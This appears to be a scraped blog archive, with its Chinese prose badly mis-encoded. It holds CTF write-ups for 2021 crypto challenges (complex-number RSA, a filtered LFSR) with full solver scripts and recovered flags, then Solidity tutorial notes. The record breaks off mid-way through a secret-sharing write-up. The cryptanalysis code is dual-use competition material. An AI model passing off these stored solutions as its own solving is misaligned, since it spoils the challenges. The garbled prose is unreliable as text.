é¼ éš¾ä½äº†æ\nsrc\nfrom Crypto.Util.number import * # from flag import flag import random def add(P1,P2): x1,y1=P1 x2,y2=P2 x3=(x1*x2-y1*y2)%n y3=(x1*y2+x2*y1)%n return (x3,y3) def mul(P,k): assert k\u0026gt;=0 Q=(1,0) while k\u0026gt;0: if k%2: k-=1 Q=add(P,Q) else: k//=2 P=add(P,P) return Q def getMyPrime(): while True: q=getPrime(88) p=2*q+1 if isPrime(p): return p e=getPrime(256) n=getMyPrime()*getMyPrime()*getMyPrime() print(\u0026#39;n=%d\u0026#39;%n) G=(1,1) # HINT=mul(G,e) g=G Q=(1,0) for i in range(10): g=add(g,Q) print(i,g) print(add(G,G)) print(mul(G,3)) print(mul(G,8)) # print(\u0026#39;HINT=%s\u0026#39;%str(HINT)) # x=bytes_to_long(flag[7:39]) # y=bytes_to_long(flag[39:-1]) # M=(x,y) # C=mul(M,e) # print(\u0026#39;C=%s\u0026#39;%str(C)) \u0026#39;\u0026#39;\u0026#39; n=92916331959725072239888159454032910975918656644816711315436128106147081837990823 HINT=(1225348982571480649501200428324593233958863708041772597837722864848672736148168, 1225348982571480649501200428324593233958863708041772597837722864848672736148168) C=(44449540438169324776115009805536158060439126505148790545560105884100348391877176, 73284708680726118305136396988078557189299357177640330968917927635171441710392723) \u0026#39;\u0026#39;\u0026#39; å­¦ä¹ å¤æ—¦å¤§å“¥åšå®¢å¾—çŸ¥è¿™ç©æ„æ˜¯\nå¤æ•°åŸŸä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜+å¤æ•°RSAï¼š\n$(X_1+iY_1)(X_2+iY_2)=X_1X_2 + i^2(Y_1Y_2) + i(X_1Y_2+X_2Y_1)$\n$=X_1X_2 -(Y_1Y_2) + i(X_1Y_2+X_2Y_1)$\næ‰€ä»¥ï¼ŒXå­˜æ”¾çš„æ˜¯å®éƒ¨ï¼ŒYå­˜æ”¾è™šéƒ¨ã€‚ã€‚ã€‚\nç®€å†™ä¸‹æ¥å°±æ˜¯è¿™æ ·\n$Z^e=(X+iY)^e\\pmod{n}$\nè¿™é‡Œeæ²¡ç»™ï¼Œæƒ³è¦å…ˆæ±‚ç¦»æ•£å¯¹æ•°æ‹¿e\nè¿™é‡Œçš„ç®—æ³•æ˜¯å°†å®æ•°å’Œå¤æ•°æå‡ºæ¥æ„å»ºåˆ°åæ ‡è½´ä¸Šè®¡ç®—\nè¿™æ ·ä¸€æ¥æ‰€æœ‰è®¡ç®—å°±éƒ½åœ¨å®æ•°ä¸Šäº†\n$cip=\\sqrt{x^2+y^2}$\n$cip^2=x^2+y^2$\n$G=(1,1),OG=1+1=2$\n$x^2+y^2=(1+1)^e=OC = OG^e\\pmod{N}$\n# SageMath script mod = 92916331959725072239888159454032910975918656644816711315436128106147081837990823 cipher = 1225348982571480649501200428324593233958863708041772597837722864848672736148168^2*2%mod base = 2 e = pari(f\u0026#34;znlog({cipher},Mod({base},{mod}))\u0026#34;) print(e) exp\nfrom Crypto.Util.number import long_to_bytes import gmpy2 def add(P1,P2): x1,y1=P1 x2,y2=P2 x3=(x1*x2-y1*y2)%n y3=(x1*y2+x2*y1)%n return (x3,y3) def mul(P,k): assert k\u0026gt;=0 Q=(1,0) while k\u0026gt;0: if k%2: k-=1 Q=add(P,Q) else: k//=2 P=add(P,P) return Q n=92916331959725072239888159454032910975918656644816711315436128106147081837990823 HINT=(1225348982571480649501200428324593233958863708041772597837722864848672736148168, 1225348982571480649501200428324593233958863708041772597837722864848672736148168) C=(44449540438169324776115009805536158060439126505148790545560105884100348391877176, 73284708680726118305136396988078557189299357177640330968917927635171441710392723) from Crypto.Util.number import long_to_bytes import gmpy2 e = 96564183954285580248216944343172776827819893296479821021220123492652817873253 # sage: factor(92916331959725072239888159454032910975918656644816 # ....: 711315436128106147081837990823) # 425886199617876462796191899 * 434321947632744071481092243 * 502327221194518528553936039 p = [425886199617876462796191899, 434321947632744071481092243, 502327221194518528553936039] phi = (p[0]**2-1)*(p[1]**2-1)*(p[2]**2-1) d = gmpy2.invert(e, phi) M = mul(C,d) print(mul(M,e)==C) # assert mul(G,e)==HINT print(long_to_bytes(M[0])+long_to_bytes(M[1])) # True # b\u0026#39;47f4f203afe894ddbb1bcf6368d901cf93990354dadbc5b7794e199d4f0b59cb\u0026#39; FilterRandom # åŠ äº†å±‚çš„å¥—å¨ƒlfsr\nsrc\nimport random from secret import init1,init2,flag class lfsr(): def __init__(self, state, mask, length): self.state = state self.mask = mask self.lengthmask = 2**length-1 def next(self): nextdata = (self.state \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask tmp = self.state \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while tmp != 0: output ^= (tmp \u0026amp; 1) tmp = tmp \u0026gt;\u0026gt; 1 nextdata ^= output self.state = nextdata return output def my_filter(c1,c2): if random.random()\u0026gt;0.1: return str(c1) else: return str(c2) N=64 mask1=random.getrandbits(N) mask2=random.getrandbits(N) print(mask1) print(mask2) l1=lfsr(init1,mask1,N) l2=lfsr(init2,mask2,N) output=\u0026#39;\u0026#39; for i in range(2048): output+=my_filter(l1.next(),l2.next()) print(output) \u0026#39;\u0026#39;\u0026#39; 17638491756192425134 14623996511862197922 10001011010100011000100101001011100010110111001100001110000111011011100101101101000111101100010111100011000011111111010101111100101010101100010100000111011010011110111000100000101100101010110100111100011000101010101011011111011011000001101001011000010000011110001111001111011100110011111111101000111101001010000110001110111101001001101011101101001010001101010010110000000000001001101100101011110011010110011010110110011001001111001010100011110111100100010110111100110010000000010010011110001100000011000001110001000000010000100100101100000011100000011110101001011010011010100001101000010100100000011001011001000110000000000111011101000110010110111110010101110010001010001111111000011010000011001110111001000010011000000111010111100000100010011001111101110110100100011111000111000011111101010010110011111100010000100101011000001010101111101111001000011101111000111000101011010111100110001011011100101001010110110110110011100100111100110001101110010100010111100000110000010110100010001100011011001100100110101110010100011101110110010000010011100000011100000101010011011111110000100000010001010111011011111110100111100011100011110110010001011101111001011101010110111001001000111001001111001111110111111100001111100100110011111110110101000011010111110010001100000111100010011100011010000101010111010101101000011001110011000000110110110001101100110101110010010111011100110101000110000011001010100000110000000001110010001010001001101111100001111111011010010011100110010000111010001001111111110000010101110011010100100101101100111000010110100110010001010110111110011000111011101110100010000110110110011001011111011111000000000000001110000001000011000110111000000110100110110001111011111100010010011100101010000111000011111010000001010010011101010010110011000000001111110000000010111011000010001111000100110101110001000011111001101111111100011111011001001110000101001101110100111010011011101000110010000001001000001100110001110101100001000110100100010111101100010100110011111010011100100001101111010000110110101111111001111011100001101100000001101111100100 \u0026#39;\u0026#39;\u0026#39; ä¸¤ä¸ª64ä½çš„lfsrï¼Œè®¾ä¸ºs1,s2,åŠ äº†ä¸ªæ»¤æ³¢ï¼Œä¹Ÿå°±æ˜¯random()\u0026gt;0.1æ—¶ï¼Œè¾“å‡ºs1,å¦åˆ™è¾“å‡ºs2ã€‚è®¤ä¸ºrandomå¾ˆéšæœºï¼Œé‚£ä¹ˆæ‰€æœ‰è¾“å‡ºçš„å¾ˆå¤§ä¸€éƒ¨åˆ†éƒ½æ˜¯æ¥è‡ªäºs1,é‚£ä¹ˆåº”è¯¥æœ‰è¿ç»­64ä¸ªè¾“å‡ºåŒæ—¶æ¥è‡ªäºs1ã€‚ä¹Ÿå°±æ˜¯çŸ¥é“lfsrçš„ä¸€ä¸ªç°æ€ï¼Œå¯ä»¥é€†lfsrå›æº¯åˆ°åˆæ€ï¼Œå†åˆ©ç”¨æ¬¡åˆæ€ç”Ÿæˆè¾“å‡ºæµï¼Œè‹¥ä¸é¢˜ç›®ä¸­è¾“å‡ºæµç›¸ç¬¦ç¨‹åº¦å¾ˆå¤§ï¼Œåˆ™å¯è®¤ä¸ºæ­¤æ—¶çš„åˆæ€æ˜¯æ­£ç¡®çš„ã€‚\nå¯¹äºé€†lfsrï¼Œå¼‚æˆ–çŸ©é˜µç›´æ¥æ¢­å“ˆ\nå«–ä»£ç \nclass lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**length-1 def next(self): nextdata = (self.init \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask i = self.init \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while i != 0: output ^= (i \u0026amp; 1) i = i \u0026gt;\u0026gt; 1 nextdata ^= output self.init = nextdata return output output=\u0026#39;10001011010100011000100101001011100010110111001100001110000111011011100101101101000111101100010111100011000011111111010101111100101010101100010100000111011010011110111000100000101100101010110100111100011000101010101011011111011011000001101001011000010000011110001111001111011100110011111111101000111101001010000110001110111101001001101011101101001010001101010010110000000000001001101100101011110011010110011010110110011001001111001010100011110111100100010110111100110010000000010010011110001100000011000001110001000000010000100100101100000011100000011110101001011010011010100001101000010100100000011001011001000110000000000111011101000110010110111110010101110010001010001111111000011010000011001110111001000010011000000111010111100000100010011001111101110110100100011111000111000011111101010010110011111100010000100101011000001010101111101111001000011101111000111000101011010111100110001011011100101001010110110110110011100100111100110001101110010100010111100000110000010110100010001100011011001100100110101110010100011101110110010000010011100000011100000101010011011111110000100000010001010111011011111110100111100011100011110110010001011101111001011101010110111001001000111001001111001111110111111100001111100100110011111110110101000011010111110010001100000111100010011100011010000101010111010101101000011001110011000000110110110001101100110101110010010111011100110101000110000011001010100000110000000001110010001010001001101111100001111111011010010011100110010000111010001001111111110000010101110011010100100101101100111000010110100110010001010110111110011000111011101110100010000110110110011001011111011111000000000000001110000001000011000110111000000110100110110001111011111100010010011100101010000111000011111010000001010010011101010010110011000000001111110000000010111011000010001111000100110101110001000011111001101111111100011111011001001110000101001101110100111010011011101000110010000001001000001100110001110101100001000110100100010111101100010100110011111010011100100001101111010000110110101111111001111011100001101100000001101111100100\u0026#39; mask1=17638491756192425134 mask2=14623996511862197922 N=64 def delfsr(rounds,init,mask): for j in range(rounds+N): t=init%2 init=init\u0026gt;\u0026gt;1 t^=bin(init\u0026amp;mask)[2:].count(\u0026#39;1\u0026#39;)%2 init=(t\u0026lt;\u0026lt;(N-1))+init return init def correlation(A,B): assert len(A)==len(B) N=2048 d=0 for i in range(len(A)): if A[i]==B[i]: d+=1 return d/N def guess_init1(output,mask): possible,max_p=0,0.0 for i in range(0,len(output)-N): init=int(output[i:i+N],2) init=delfsr(i,init,mask) LFSR=lfsr(init,mask,N) out=\u0026#39;\u0026#39; for i in range(2048): out+=str(LFSR.next()) p=correlation(out,output) if p\u0026gt;max_p: possible,max_p=init,p print(\u0026#39;possible: \u0026#39;,possible) print(\u0026#39;max_p: \u0026#39;,max_p) return possible init1=guess_init1(output,mask1) #15401137114601469828 \u0026#39;\u0026#39;\u0026#39; possible: 15401137114601469828 max_p: 0.9453125 \u0026#39;\u0026#39;\u0026#39; init1=15401137114601469828 LFSR=lfsr(init1,mask1,N) \u0026#39;\u0026#39;\u0026#39; known=[] for i in range(2048): o=LFSR.next() if o !=int(output[i]): known.append((i,int(output[i]))) #print(known) \u0026#39;\u0026#39;\u0026#39; known=[(4, 1), (12, 0), (30, 1), (37, 0), (41, 1), (53, 1), (69, 0), (85, 1), (97, 1), (101, 0), (146, 0), (148, 0), (193, 0), (196, 1), (260, 0), (281, 0), (341, 1), (357, 1), (390, 1), (407, 0), (428, 0), (431, 0), (438, 1), (477, 1), (520, 0), (523, 0), (529, 0), (539, 0), (541, 1), (566, 0), (607, 1), (613, 0), (619, 0), (623, 1), (640, 0), (660, 1), (733, 0), (750, 0), (811, 0), (816, 0), (824, 0), (873, 1), (887, 0), (906, 1), (910, 0), (939, 0), (948, 0), (959, 0), (971, 1), (977, 0), (1001, 1), (1026, 1), (1030, 0), (1046, 0), (1052, 0), (1078, 0), (1082, 0), (1109, 1), (1120, 0), (1126, 0), (1137, 1), (1158, 1), (1163, 0), (1194, 1), (1195, 1), (1222, 1), (1237, 1), (1244, 1), (1280, 0), (1286, 0), (1311, 1), (1345, 1), (1391, 0), (1401, 0), (1415, 0), (1440, 1), (1456, 0), (1495, 1), (1506, 0), (1518, 0), (1532, 1), (1535, 1), (1571, 1), (1612, 0), (1619, 0), (1624, 1), (1642, 0), (1646, 1), (1654, 0), (1709, 0), (1718, 0), (1745, 0), (1764, 0), (1792, 0), (1797, 1), (1834, 1), (1848, 1), (1855, 1), (1861, 1), (1871, 0), (1894, 0), (1901, 0), (1906, 1), (1925, 0), (1950, 0), (1967, 0), (1970, 0), (1979, 0), (2026, 1), (2027, 1), (2036, 1), (2046, 0)] M = block_matrix(Zmod(2), [Matrix([0] * 63), identity_matrix(63)], nrows = 2, subdivide = False) mask = mask2.digits(2)[::-1] mask = Matrix(Zmod(2), mask).T M = block_matrix(Zmod(2), [M, mask], ncols = 2, subdivide = False) A = [] for index, out in known: A.append((M^index*mask).list()) A = Matrix(Zmod(2), A).T y = vector(Zmod(2), [x[1] for x in known]) init=A.solve_left(y).list() print(int(\u0026#39;\u0026#39;.join([str(i) for i in init]),2)) #11256716742701089092 è¿˜æœ‰ä¸ªå•¥é¢˜ å«å•¥wiener # è®°å¾—åˆ°æ—¶å€™å»å«–è„šæœ¬ğŸ‘¨â€ğŸ¦³ ","date":"15 December 2021","permalink":"/achieve/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021crypto/","section":"archive","summary":"","title":"Document for è¥¿æ¹–è®ºğŸ—¡ğŸ”ªâš”ğŸ–‹âœ‚"},{"content":"\rA Simple Smart Contract # To access a member (like a state variable) of the current contract, you do not typically add theÂ this.Â prefix, you just access it directly via its name. Unlike in some other languages, omitting it is not just a matter of style, it results in a completely different way to access the member, but more on this later.\nremixä½¿ç”¨çš„ä¸‰ç§ç¯å¢ƒï¼Œåˆ†åˆ«æŒ‡:\njs VM:remixè‡ªå¸¦çš„sandboxç¯å¢ƒç»ƒä¹ ç¯å¢ƒ è™šæ‹Ÿäº†ä¸€ä¸ªèŠ‚ç‚¹ inject web3å’Œprovider web3éƒ½æ˜¯æƒ³è¦è¿æ¥çœŸå®èŠ‚ç‚¹ è¿æ¥matemaskä¸€èˆ¬ç”¨ inject web3\nè¿æ¥ganacheçš„æœ¬åœ°è™šæ‹Ÿç”¨provider web3?\nå…ˆæä¸€ä¸ªæ•°æ®å­˜å…¥storedata,getå‡½æ•°å–å‡º\nç»ƒä¹ å¹³å° # https://cryptozombies.io/zh/\nä¸€ä¸ªsolidityç»ƒä¹ å¹³å°ï¼Œæœ‰ç‚¹åƒjs\nstage1 # åŸºç¡€+event\npragma solidity ^0.4.19; contract ZombieFactory { //event æ˜¯åˆçº¦å’ŒåŒºå—é“¾é€šè®¯çš„ä¸€ç§æœºåˆ¶ã€‚ä½ çš„å‰ç«¯åº”ç”¨â€œç›‘å¬â€æŸäº›äº‹ä»¶ï¼Œå¹¶åšå‡ºååº”ã€‚ event NewZombie(uint zombieId, string name, uint dna); uint dnaDigits = 16; uint dnaModulus = 10 ** dnaDigits; struct Zombie { string name; uint dna; } Zombie[] public zombies; function _createZombie(string _name, uint _dna) private { //array.push() - 1 å°†æ˜¯æˆ‘ä»¬åŠ å…¥çš„åƒµå°¸çš„ç´¢å¼•ã€‚ //zombies.push() - 1 å°±æ˜¯ idï¼Œæ•°æ®ç±»å‹æ˜¯ uintã€‚ uint id = zombies.push(Zombie(_name, _dna)) - 1; NewZombie(id, _name, _dna); } //å‡½æ•°ä¿®é¥°ç¬¦ //view æ„å‘³ç€å®ƒåªèƒ½è¯»å–æ•°æ®ä¸èƒ½æ›´æ”¹æ•°æ® function _generateRandomDna(string _str) private view returns (uint) { //Ethereum å†…éƒ¨æœ‰ä¸€ä¸ªæ•£åˆ—å‡½æ•°keccak256ï¼Œå®ƒç”¨äº†SHA3ç‰ˆæœ¬ã€‚ uint rand = uint(keccak256(_str)); return rand % dnaModulus; } function createRandomZombie(string _name) public { uint randDna = _generateRandomDna(_name); _createZombie(_name, randDna); } } Solidity è¿˜æ”¯æŒÂ pureÂ å‡½æ•°, è¡¨æ˜è¿™ä¸ªå‡½æ•°ç”šè‡³éƒ½ä¸è®¿é—®åº”ç”¨é‡Œçš„æ•°æ®ï¼Œä¾‹å¦‚ï¼š\nfunction _multiply(uint a, uint b) private pure returns (uint) { return a * b; } stage2 # addresses ï¼ˆåœ°å€ # ä»¥å¤ªåŠåŒºå—é“¾ç”± _ account _Â (è´¦æˆ·)ç»„æˆï¼Œä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆé“¶è¡Œè´¦æˆ·ã€‚ä¸€ä¸ªå¸æˆ·çš„ä½™é¢æ˜¯Â ETH ï¼ˆåœ¨ä»¥å¤ªåŠåŒºå—é“¾ä¸Šä½¿ç”¨çš„å¸ç§ï¼‰ï¼Œä½ å¯ä»¥å’Œå…¶ä»–å¸æˆ·ä¹‹é—´æ”¯ä»˜å’Œæ¥å—ä»¥å¤ªå¸ï¼Œå°±åƒä½ çš„é“¶è¡Œå¸æˆ·å¯ä»¥ç”µæ±‡èµ„é‡‘åˆ°å…¶ä»–é“¶è¡Œå¸æˆ·ä¸€æ ·ã€‚\næ¯ä¸ªå¸æˆ·éƒ½æœ‰ä¸€ä¸ªâ€œåœ°å€â€ï¼Œä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆé“¶è¡Œè´¦å·ã€‚è¿™æ˜¯è´¦æˆ·å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå®ƒçœ‹èµ·æ¥é•¿è¿™æ ·ï¼š\n0x0cE446255506E92DF41614C46F1d6df9Cc969183\næ­¤å¤„çš„addressæ˜¯ä¸€ç§ç‹¬ç«‹çš„æ•°æ®ç±»å‹\nMappingï¼ˆæ˜ å°„ï¼‰ # åœ¨ç¬¬1è¯¾ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†Â _ ç»“æ„ä½“ _Â å’ŒÂ _ æ•°ç»„ _Â ã€‚Â æ˜ å°„Â æ˜¯å¦ä¸€ç§åœ¨ Solidity ä¸­å­˜å‚¨æœ‰ç»„ç»‡æ•°æ®çš„æ–¹æ³•ã€‚\nç±»ä¼¼äºpythonçš„å­—å…¸ï¼Œæ”¯æŒé€šè¿‡keyæŸ¥æ‰¾value\n//å¯¹äºé‡‘èåº”ç”¨ç¨‹åºï¼Œå°†ç”¨æˆ·çš„ä½™é¢ä¿å­˜åœ¨ä¸€ä¸ª uintç±»å‹çš„å˜é‡ä¸­ï¼š mapping (address =\u0026gt; uint) public accountBalance; //æˆ–è€…å¯ä»¥ç”¨æ¥é€šè¿‡userId å­˜å‚¨/æŸ¥æ‰¾çš„ç”¨æˆ·å mapping (uint =\u0026gt; string) userIdToName; msg.sender # åœ¨ Solidity ä¸­ï¼Œæœ‰ä¸€äº›å…¨å±€å˜é‡å¯ä»¥è¢«æ‰€æœ‰å‡½æ•°è°ƒç”¨ã€‚ å…¶ä¸­ä¸€ä¸ªå°±æ˜¯Â msg.senderï¼Œå®ƒæŒ‡çš„æ˜¯å½“å‰è°ƒç”¨è€…ï¼ˆæˆ–æ™ºèƒ½åˆçº¦ï¼‰çš„Â addres(å³creator or admin)\nrequire # è¿™ç©æ„ç±»ä¼¼pythonçš„æ–­è¨€ï¼Œè‹¥ä¸ºå‡åˆ™ä¼šåœæ­¢æ‰§è¡Œ,å¹¶é‡ç½®requireç®¡è¾–åŒºåŸŸçš„ä¿®æ”¹\nç»§æ‰¿ï¼ˆInheritanceï¼‰ # å½“ä»£ç è¿‡äºå†—é•¿çš„æ—¶å€™ï¼Œæœ€å¥½å°†ä»£ç å’Œé€»è¾‘åˆ†æ‹†åˆ°å¤šä¸ªä¸åŒçš„åˆçº¦ä¸­ï¼Œä»¥ä¾¿äºç®¡ç†ã€‚\næœ‰ä¸ªè®© Solidity çš„ä»£ç æ˜“äºç®¡ç†çš„åŠŸèƒ½ï¼Œå°±æ˜¯åˆçº¦Â inheritanceÂ (ç»§æ‰¿)ï¼š\ncontract Doge { function catchphrase() public returns (string) { return \u0026#34;So Wow CryptoDoge\u0026#34;; } } contract BabyDoge is Doge { function anotherCatchphrase() public returns (string) { return \u0026#34;Such Moon BabyDoge\u0026#34;; } } Storageä¸Memory # StorageÂ å˜é‡æ˜¯æŒ‡æ°¸ä¹…å­˜å‚¨åœ¨åŒºå—é“¾ä¸­çš„å˜é‡ã€‚Â MemoryÂ å˜é‡åˆ™æ˜¯ä¸´æ—¶çš„ï¼Œå½“å¤–éƒ¨å‡½æ•°å¯¹æŸåˆçº¦è°ƒç”¨å®Œæˆæ—¶ï¼Œå†…å­˜å‹å˜é‡å³è¢«ç§»é™¤ã€‚ ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆå­˜å‚¨åœ¨ä½ ç”µè„‘çš„ç¡¬ç›˜æˆ–æ˜¯RAMä¸­æ•°æ®çš„å…³ç³»\nå‡½æ•°å¯è§æ€§ # æˆ‘ä»¬å°è¯•ä»Â ZombieFeedingÂ ä¸­è°ƒç”¨Â _createZombieÂ å‡½æ•°ï¼Œä½†Â _createZombieÂ å´æ˜¯Â ZombieFactoryÂ çš„Â privateÂ ï¼ˆç§æœ‰ï¼‰å‡½æ•°ã€‚\ninternalÂ å’ŒÂ privateÂ ç±»ä¼¼ï¼Œä¸è¿‡ï¼Œ å¦‚æœæŸä¸ªåˆçº¦ç»§æ‰¿è‡ªå…¶çˆ¶åˆçº¦ï¼Œè¿™ä¸ªåˆçº¦å³å¯ä»¥è®¿é—®çˆ¶åˆçº¦ä¸­å®šä¹‰çš„â€œå†…éƒ¨â€å‡½æ•°ã€‚\nexternalÂ ä¸publicÂ ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™äº›å‡½æ•°åªèƒ½åœ¨åˆçº¦ä¹‹å¤–è°ƒç”¨\npragma solidity ^0.4.19; import \u0026#34;./zombiefactory.sol\u0026#34;; contract ZombieFeeding is ZombieFactory { function feedAndMultiply(uint _zombieId, uint _targetDna) public { require(msg.sender == zombieToOwner[_zombieId]); Zombie storage myZombie = zombies[_zombieId]; _targetDna = _targetDna % dnaModulus; uint newDna = (myZombie.dna + _targetDna) / 2; _createZombie(\u0026#34;NoName\u0026#34;, newDna); } } ----- function _createZombie(string _name, uint _dna) internal { uint id = zombies.push(Zombie(_name, _dna)) - 1; zombieToOwner[id] = msg.sender; ownerZombieCount[msg.sender]++; NewZombie(id, _name, _dna); } ---- ä¸å…¶ä»–åˆçº¦çš„äº¤äº’ # å¦‚æœæˆ‘ä»¬çš„åˆçº¦éœ€è¦å’ŒåŒºå—é“¾ä¸Šçš„å…¶ä»–çš„åˆçº¦ä¼šè¯ï¼Œåˆ™éœ€å…ˆå®šä¹‰ä¸€ä¸ªÂ interfaceÂ (æ¥å£)ã€‚\nå…ˆä¸¾ä¸€ä¸ªç®€å•çš„æ —å­ã€‚ å‡è®¾åœ¨åŒºå—é“¾ä¸Šæœ‰è¿™ä¹ˆä¸€ä¸ªåˆçº¦ï¼š\ncontract LuckyNumber { mapping(address =\u0026gt; uint) numbers; function setNum(uint _num) public { numbers[msg.sender] = _num; } function getNum(address _myAddress) public view returns (uint) { return numbers[_myAddress]; } } è¿™æ˜¯ä¸ªå¾ˆç®€å•çš„åˆçº¦ï¼Œæ‚¨å¯ä»¥ç”¨å®ƒå­˜å‚¨è‡ªå·±çš„å¹¸è¿å·ç ï¼Œå¹¶å°†å…¶ä¸æ‚¨çš„ä»¥å¤ªåŠåœ°å€å…³è”ã€‚ è¿™æ ·å…¶ä»–äººå°±å¯ä»¥é€šè¿‡æ‚¨çš„åœ°å€æŸ¥æ‰¾æ‚¨çš„å¹¸è¿å·ç äº†ã€‚\nç°åœ¨å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå¤–éƒ¨åˆçº¦ï¼Œä½¿ç”¨Â getNumÂ å‡½æ•°å¯è¯»å–å…¶ä¸­çš„æ•°æ®ã€‚\né¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰Â LuckyNumberÂ åˆçº¦çš„Â interfaceÂ ï¼š\ncontract NumberInterface { function getNum(address _myAddress) public view returns (uint); } è¯·æ³¨æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹è™½ç„¶çœ‹èµ·æ¥åƒåœ¨å®šä¹‰ä¸€ä¸ªåˆçº¦ï¼Œä½†å…¶å®å†…é‡Œä¸åŒï¼š\né¦–å…ˆï¼Œæˆ‘ä»¬åªå£°æ˜äº†è¦ä¸ä¹‹äº¤äº’çš„å‡½æ•° â€”â€” åœ¨æœ¬ä¾‹ä¸­ä¸ºÂ getNumÂ â€”â€” åœ¨å…¶ä¸­æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨åˆ°ä»»ä½•å…¶ä»–çš„å‡½æ•°æˆ–çŠ¶æ€å˜é‡ã€‚\nå…¶æ¬¡ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ä½¿ç”¨å¤§æ‹¬å·ï¼ˆ{Â å’ŒÂ }ï¼‰å®šä¹‰å‡½æ•°ä½“ï¼Œæˆ‘ä»¬å•å•ç”¨åˆ†å·ï¼ˆ;ï¼‰ç»“æŸäº†å‡½æ•°å£°æ˜ã€‚è¿™ä½¿å®ƒçœ‹èµ·æ¥åƒä¸€ä¸ªåˆçº¦æ¡†æ¶ã€‚\nç¼–è¯‘å™¨å°±æ˜¯é è¿™äº›ç‰¹å¾è®¤å‡ºå®ƒæ˜¯ä¸€ä¸ªæ¥å£çš„ã€‚\nä½¿ç”¨æ¥å£ # ç»§ç»­å‰é¢Â NumberInterfaceÂ çš„ä¾‹å­ï¼Œæˆ‘ä»¬æ—¢ç„¶å°†æ¥å£å®šä¹‰ä¸ºï¼š\ncontract NumberInterface { function getNum(address _myAddress) public view returns (uint); } æˆ‘ä»¬å¯ä»¥åœ¨åˆçº¦ä¸­è¿™æ ·ä½¿ç”¨ï¼š\ncontract MyContract { address NumberInterfaceAddress = 0xab38... // ^ The address of the FavoriteNumber contract on Ethereum NumberInterface numberContract = NumberInterface(NumberInterfaceAddress); // Now `numberContract` is pointing to the other contract function someFunction() public { // Now we can call `getNum` from that contract: //åˆ©ç”¨æ¥å£æ¥è®¿é—®å…¶ä»–åœ°å€ä¸­çš„åˆçº¦,(solidityç‰¹æœ‰äº¤äº’æ¨¡å¼) uint num = numberContract.getNum(msg.sender); // ...and do something with `num` here } } é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåªè¦å°†æ‚¨åˆçº¦çš„å¯è§æ€§è®¾ç½®ä¸ºpublic(å…¬å…±)æˆ–external(å¤–éƒ¨)ï¼Œå®ƒä»¬å°±å¯ä»¥ä¸ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„ä»»ä½•å…¶ä»–åˆçº¦è¿›è¡Œäº¤äº’ã€‚\nNumberInterface numberContract = NumberInterface(NumberInterfaceAddress);\nè‡³æ­¤ï¼Œæˆ‘ä»¬æŒæ¡äº†åŸºæœ¬çš„äº¤äº’æ–¹æ³•ï¼Œå¯ä»¥å°è¯•å»å®Œæˆä¸€äº›æµ‹è¯•é“¾çš„æ™ºèƒ½åˆçº¦æ“ä½œäº†\nå“¦ï¼Œæ³¨æ„ä¸€ä¸‹ï¼Œåœ¨å¼€å§‹å‰ï¼Œæœ€å¥½æ‰¾å¤§å“¥ä»¬è¦ä¸€ç‚¹æµ‹è¯•é“¾çš„ETHå­˜å…¥matemaskä»¥ä½œä¸ºgasğŸ˜€ğŸ˜€ğŸ˜€\nå¤„ç†è¿”å›å€¼ # åƒpythonä¸€æ ·,sodityå¯ä»¥å¤„ç†å¤§é‡çš„è¿”å›å€¼\nfunction processMultipleReturns() external { uint a; uint b; uint c; // è¿™æ ·æ¥åšæ‰¹é‡èµ‹å€¼: (a, b, c) = multipleReturns(); } // æˆ–è€…å¦‚æœæˆ‘ä»¬åªæƒ³è¿”å›å…¶ä¸­ä¸€ä¸ªå˜é‡: function getLastReturnValue() external { uint c; // å¯ä»¥å¯¹å…¶ä»–å­—æ®µç•™ç©º: (,,c) = multipleReturns(); } ","date":"27 November 2021","permalink":"/achieve/2019to2021/solidity-document/","section":"archive","summary":"","title":"A tour of solidity"},{"content":"\rç¥¥äº‘ber secret_share # ä¸‹åˆæ¥æ¨äº†ä¸€åŠå°±å‡ºå»åƒä¸œè¥¿å»äº†ğŸ˜˜ğŸ˜˜\nçœ‹äº†wpå‘ç°åªè¦å‡ ä¸ªæ­¥éª¤ä¸²èµ·æ¥å…¶å®ä¸éš¾çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘åªä¼šç‚¼ä¸¹å§ã€‚ã€‚ã€‚\nåŸºæœ¬åŠ è§£å¯†ï¼š\nenc\n$E = g^e\\mod p,V=g^v\\mod p\\ s = v+e(h2(E||V))$\n$c = m*pk^{e+v}\\mod p$\nr_enc:\n$E_- = g^{e\\times skI\\times dd} , V_-=g^{v\\times skI\\times dd}$\n$E = g^{e},V=g^{v}$\n$c = m\\times (EV)^{skI}\\mod p =m\\times (E_-V_-)^{inv(dd,p-1)}\\mod p$\nè¿™é‡Œæ‹¿åˆ°ddå°±å¯ä»¥æè§£å¯†äº†ï¼Œè§£ddçš„å‰ææ˜¯å§encoderææ¸…æ¥š\nencoderå½“æ—¶æ²¡ç»†çœ‹ï¼Œå…¶å®å˜åŒ–å†™å®Œäº†ä¸€çœ‹å°±å¾ˆç®€å•äº†\nç…§ç€ğŸ‘´ä»¬çš„æ¶ˆå…ƒå­¦ä¹ äº†\nè¿ç»­4æ¬¡æ¨å¾—skæ‹¿åˆ°éšæœºå‡ºæ¥çš„må¯ä»¥å¾—åˆ°\n$mul={sk}^4\\cdot dd_1\\cdot dd_2\\cdot dd_3\\cdot dd_4%p$\n$dd_i$æ˜¯å·²çŸ¥çš„,æœ‰äº›solveæ˜¯åŸŸä¸‹å¼€æ 